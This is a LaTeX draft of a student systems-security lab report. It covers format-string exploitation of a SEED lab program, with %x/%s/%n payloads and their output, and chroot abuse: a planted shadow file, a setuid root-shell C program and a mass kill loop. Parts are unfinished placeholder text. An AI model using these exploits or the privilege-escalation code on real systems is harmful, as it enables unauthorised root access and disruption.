\documentclass[12pt, a4paper, pdflatex]{article}

\usepackage[top=1in, bottom=1in, left=1in, right=1in]{geometry}
\newcommand{\HRule}{\rule{\linewidth}{0.5mm}}
\usepackage{lipsum}
\usepackage[labelfont=bf]{caption}
\usepackage[]{algorithm2e}
\usepackage{listings}

\renewcommand{\thesubsubsection}{\thesubsection.\alph{subsubsection})} %subsubsections with letters

\usepackage{amsmath}
\usepackage{amsfonts}    % fancy maths font
\usepackage{mathrsfs}    % fancy maths font
\usepackage{dsfont}      % indocator finction
\usepackage{hyperref}
\usepackage[usenames,dvipsnames]{color}

% \newcommand{\ts}{\textsuperscript}
% \usepackage{url}

\begin{document}
\pagenumbering{gobble}% Remove page numbers

\begin{center}
    \begin{large}
    {\HRule \\[0.2cm]}
    \textsc{System exploits}
    {\HRule \\[0.3cm]}
    \end{large}

    \begin{minipage}{ 0.49\textwidth }
        \begin{flushleft}
            Kacper \textbf{Sokol}---\texttt{ks1591}---4GGK1\\
            Maciej \textbf{Kumorek}---\texttt{mk0934}---4G403\\
        \end{flushleft}
    \end{minipage}
    \begin{minipage}{ 0.49\textwidth }
        \begin{flushright}
            {COMSM1500 $|$ Systems Security\\
            Coursework: Part A---\today\\[0.3cm]}
        \end{flushright}
    \end{minipage}
\end{center}

\section{Introduction}

\subsection{Statement of contributions}

\begin{center}
\begin{tabular}{ l | p{8.5cm} | c }
  Group member ID & Contribution outline & Contribution \\
  \hline
  ks1591 & jhkljhkhkj hklhkhkljhkhjkh kjhkhjkhkj hhhhhhjkjkhhj khjgghtfyu jhgghcfgj tytyd & 50\% \\
  mk0932 & jhkljhkhkjhklh  khkljhkhjkhkjhk hjkhkjhhhh hhjkjkhhjkhjg ghtfyujhgg hcfgjtyty d & 50\% \\
\end{tabular}
\end{center}

\section{String formatting}

Our first task was to exploit program using \emph{printf} method for formatted string output in a vulnerable way. We followed instructions of lab assignment  \url{http://www.cis.syr.edu/~wedu/seed/Labs/Vulnerability/Format_String/}
and used Ubuntu 9.10 SEED for our lab set up.

In the target program provided, a \emph{printf} method was used without any format specifier, combined with the ability for users to specify input, allowed user to fabricate any format specifier for the program, i.e. instead of printing the user output in the following way:
\vspace{1em}
\lstset{
	captionpos=b,
	frame=single,
	language=C,
  breaklines=true,
	caption=Fragment of code that would not include the vulnerability,
	label=chroot:vul
}
\begin{lstlisting}
// Get input from user
scanf("%s", &user_input);
// Print what user typed
printf("%s", user_input);
\end{lstlisting}
the \emph{printf} was used without explicitly specifying that we want to print to standard output a string.
\vspace{1em}
\lstset{
	captionpos=b,
	frame=single,
	language=C,
  breaklines=true,
	caption=Fragment of includes the vulnerability,
	label=chroot:vul2
}
\begin{lstlisting}
// Get input from user
scanf("%s", &user_input);
// Print what user typed
printf(user_input);
\end{lstlisting}


\subsection{Exploiting the vulnerability}
Being able to specify the string format specifier allows us to use \texttt{printf} method in order to either crash a program, look up values on stack and memory and even modify content at specific memory locations with a specified value. We used the following features of \texttt{printf} specifier string:
\begin{itemize}
	\item \texttt{\%x} - prints hexadecimal value provided in the arguments list
	\item \texttt{\%s} - prints value at the current memory location from the heap provided by arguments list
	\item \texttt{\%n} - writes number of bytes written so far to the output at the current location provided by arguments list
\end{itemize}
It's important to realize that argument list for printf would be kept on the stack. Therefore we can use \texttt{printf} to traverse the stack using for instance many \texttt{\%x} in the input string.

\subsubsection{Crashing the program}
In order to crash the program it was enough to provide a string as input that contained a few \texttt{\%s}. This way values popped from the stack would be provided to the \texttt{printf} method and memory address at the locations specified by the values. At some point the program attempts to access memory that the process shouldn't be able to. This results in a segmentation fault and a crash of the program.

\vspace{1em}
\lstset{
	captionpos=b,
	frame=single,
	language=bash,
  breaklines=true,
	caption=Example of crashing the program,
	label=printf:crash
}
\begin{lstlisting}
seed@seed-desktop:~/cwk2$ ./a.out 
The variable secret's address is 0xbf8f35d8 (on stack)
The variable secret's value is 0x 9c1d008 (on heap)
secret[0]'s address is 0x 9c1d008 (on heap)
secret[1]'s address is 0x 9c1d00c (on heap)
Please enter a string
%s%s%s%s%s%s%s%s
Segmentation fault
\end{lstlisting}

\subsubsection{Printing out specified memory from heap}
In the second part of this task we wanted to be able to provide such a format specifier that would allow us to print out some specified memory location. In this example we wanted to print out value of two-element array secret. Because provided vulnerable program to exploit prints out the address of both secrets values on the heap, we know where to look for them. We need to use \texttt{\%s} format specifier to access memory location of 
\texttt{secret} array. We ask to print six values from the stack, and the next variable on the stack would contain address to the first element of secret. However, secret is on the heap, so it's not to easy to access the second element of the array. We used the fact that a user is also prompted to input the decimal integer. Hence at runtime we can see where \texttt{secret[1]} is, and provide the address of \texttt{secret[1]} on heap, in decimal format, to be stored in \texttt{int\_input} integer variable. Now since that value is on the stack, after poping initial 5 values, if we also add \texttt{\%s.\%s} in the format specifier string, we tell \texttt{printf} to show us memory content at next two memory locations, specified by the contents of next two values on the stack, which corresponds to \texttt{secret[1]} and \texttt{secret[0]} and in the output below we can see that U and D are printed. These two characters have ASCII values of 0x55 and 0x44 which is what we wanted.

\vspace{1em}
\lstset{
	captionpos=b,
	frame=single,
	language=bash,
  breaklines=true,
	caption=Example of printing out memory,
	label=printf:crash
}
\begin{lstlisting}
seed@seed-desktop:~/cwk2$ ./vul
The variable secret’s address is 0xbf8b258c (on stack)
The variable secret’s value is 0x 95fd008 (on heap)
secret[0]’s address is 0x 95fd008 (on heap)
secret[1]’s address is 0x 95fd00c (on heap)
Please enter a decimal integer
157274124
Please enter a string
%x.%x.%x.%x.%x.%s.%s   
bf8b2590.bf8b2610.bf8b2604.0.0.U.D
The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0x55
\end{lstlisting}

\subsubsection{Changing the value of \texttt{secret[1]}}

In order to change value of the second element of \texttt{secret} array, similar approach must be taken as for printing it, i.e. we provide address of the value that interests us to be stored int \texttt{int\_input} variable, then we must pop elements of the stack by providing format specifier with a number of \texttt{\%x}s, and then instead of printing value of heap memory in location contained in the next element on the stack, we can use \texttt{\%n} to write modify the memory location. Example is shown in listing~\ref{printf:change}. As we can see, we are able to change the value of the secret from 0x55 to 0x1a.

\vspace{1em}
\lstset{
	captionpos=b,
	frame=single,
	language=BASH,
	caption=Example of overwriting memory,
	label=printf:change,
	breaklines=true,
}
\begin{lstlisting}
seed@seed-desktop:~/cwk2$ ./vul
The variable secret’s address is 0xbf83550c (on stack)
The variable secret’s value is 0x 9448008 (on heap)
secret[0]’s address is 0x 9448008 (on heap)
secret[1]’s address is 0x 944800c (on heap)
Please enter a decimal integer
155484172
Please enter a string
%x%x%x%x%x%n
bf835510bf835590bf83558400
The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0x1a
\end{lstlisting}

\subsubsection{Changing the value of \texttt{secret[1]} to a pre-determined value}

If we wanted to change \texttt{secret[1]} to a pre-determined value, we need to know exactly what \texttt{\%n} format specifier does. We know it prints a number of bytes printed in output so far into memory location on the heap determined by the current value on the top of the stack. We can see in~\ref{printf:change} that we changed the secret to 0x1a, or 26 in decimal, and before that we printed "bf835510bf835590bf83558400" which is exactly 26 one-byte wide characters. This is the minimum value we can set it to, however if we add more characters, we can keep increasing the number that will be stored in \texttt{secret[1]} until we reach desired value. For instance, if we wanted to change the value to 30 (or 0x1E), we need to stick four more characters into the format specifier string as shown in~\ref{printf:change2} where we added "AAAA".  

\vspace{1em}
\lstset{
	captionpos=b,
	frame=single,
	language=BASH,
	caption=Example of overwriting memory with a specified value,
	label=printf:change2,
	breaklines=true,
}
\begin{lstlisting}
seed@seed-desktop:~/cwk2$ ./vul
The variable secret’s address is 0xbff74c4c (on stack)
The variable secret’s value is 0x 9b18008 (on heap)
secret[0]’s address is 0x 9b18008 (on heap)
secret[1]’s address is 0x 9b1800c (on heap)
Please enter a decimal integer
162627596
Please enter a string
%x%x%x%x%xAAAA%n
bff74c50bff74cd0bff74cc400AAAA
The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0x1e
\end{lstlisting}

\subsection{Memory randomization}

Last part of the task was to show if we can perform the four task we executed before if we didn't have the extra \texttt{scanf} method that allows us to store an integer from user input into \texttt{int\_input} variable in the vulnerable program.

In order to execute this task we had to disable virtual memory randomization, so that at every consecutive execution of our program the memory addresses of the \texttt{secret} would stay exactly the same.

\section{\texttt{chroot} vulnerability}
\subsection{Understanding how \texttt{chroot} works}
\subsubsection{Symbolic link}
It is \emph{not} possible to follow symbolic link pointing outside of \texttt{chroot} jail.\\
Symbolic link uses absolute or relative path to given fail, hence once in jail this relative path is not valid any-more.

\subsubsection{Hard link}
It \emph{is} possible to follow hard link pointing outside of \texttt{chroot} jail.\\
Hard links are used all over the operating system to point to given location in file-system. Therefore regardless of jail the link always points to the same location in file-system.

\subsubsection{File descriptors}


\subsubsection{Command vs.\ system call}

\subsection{Abusing unconstrained \texttt{chroot}}
\subsubsection{\texttt{set-UID} in jail}
\emph{Set-root-UID} programs can be run inside \texttt{chroot} jail.

\subsubsection{Getting root with \texttt{su}}
It is possible to gain root privileges using \texttt{/tmp/su}. The \texttt{su} command uses \texttt{/etc/shadow} and \texttt{/etc/passwd} to verify super user authentication. We can create these files in jail---see \textbf{Listing~\ref{chroot:shadow}~and~\ref{chroot:passwd}}---to allow such authentication.\\
In this example we used known password hash of \texttt{seed} user with changed first line form \texttt{seed} to \texttt{root}, and the second file is just custom entry for root user.\\
These operations facilitate gaining \texttt{root} privileges within jail using seed password, namely ``dees''.

\vspace{1em}
\lstset{
  captionpos=b,
  frame=single,
  caption=\texttt{shadow} file in jail.,
  label=chroot:shadow
}
\begin{lstlisting}
root:$6$5MfvmFOaDU$CVt7jU9wJRYz3K98EklAJqp8RMG5NvReUSVK7ctVvc2VOn
   YVrvyTfXaIgHn2xQS78foEJZBq2oCIqwfdNp.2V1:14400:0:99999:7:::
\end{lstlisting}
\vspace{1em}
\lstset{
  captionpos=b,
  frame=single,
  language=bash,
  breaklines=true,
  caption=\texttt{passwd} file in jail.,
  label=chroot:passwd
}
\begin{lstlisting}
root:x:0:0:root:/root:/bin/bash
\end{lstlisting}

\subsubsection{Preserve root privileges after exiting jail}
It is possible to regain root privileges once exited the jail. To this end, we write simple \texttt{C} program shown in \textbf{Listing~\ref{chroot:regainingroot}}. Once compiled, we apply set-root-UID to it by executing \texttt{chown root prog} and \texttt{chmod 4755 prog}.\\
After leaving \textt{chroot} jail we execute this program and gain root privileges in non-restricted environment. This technique works as set-root-UID done in jail is not removed while exiting it hence normal user can run this script which in turn calls \textt{su -c "/bin/bash"} as a root resulting in root shell.

\vspace{1em}
\lstset{
  captionpos=b,
  frame=single,
  language=C,
  breaklines=true,
  caption=Simple \texttt{C} code allowing to regain \texttt{root} privileges.,
  label=chroot:regainingroot
}
\begin{lstlisting}
int main(){
setuid(0);
system("su -c \"/bin/bash\"");
return 0;
}
\end{lstlisting}

\subsection{Breaking out of a \texttt{chroot} jail}
\subsubsection{\texttt{cd ..} out of jail}

\subsubsection{Killing process from within the jail}
\vspace{1em}
\lstset{
  captionpos=b,
  frame=single,
  language=bash,
  breaklines=true,
  caption=Kill processes outside of chroot jail.,
  label=chroot:kill
}
\begin{lstlisting}
#!/bin/bash
i="1"
while [ $i -lt 10000 ]
do
echo $i
kill $i
i=$[$i+1]
done
\end{lstlisting}

\subsubsection{Controlling processes with \texttt{ptrace()}}
Just do loop form 1 to 10,000 with ptrace(\_option\_, i)\\
Option can be: 

\subsection{Securing \texttt{chroot}}

\section{Buffer overflow}
\lipsum[3]

\section{Conclusions}

\section{References?}

\end{document}
